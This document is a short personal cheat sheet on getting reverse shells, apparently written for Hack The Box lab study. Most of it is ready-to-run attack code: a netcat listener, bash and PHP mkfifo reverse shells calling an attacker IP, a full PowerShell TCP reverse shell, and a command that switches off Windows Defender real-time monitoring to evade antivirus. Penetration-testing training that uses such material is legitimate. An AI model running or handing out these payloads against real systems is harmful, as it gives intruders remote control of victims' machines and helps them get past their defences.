#reverse_shell
### surfaces
some common methods to get an reverse shell is exploiting web vulnerabilities like unrestricted file upload, command injection and others that can lead to RCE

netcat listening
```
nc -lvnp 443
```
its often good to use common ports to avoid being blocked by [[firewalls and AV]]

bash 
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

be aware tha probably the windows defender antvirus will block this as malicious code 
to disable the AV, we can run this command on a powershell console with admin priviligies
```
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

php
```
<?php system ("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9443 >/tmp/f"); ?>
```

resources:
	[Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)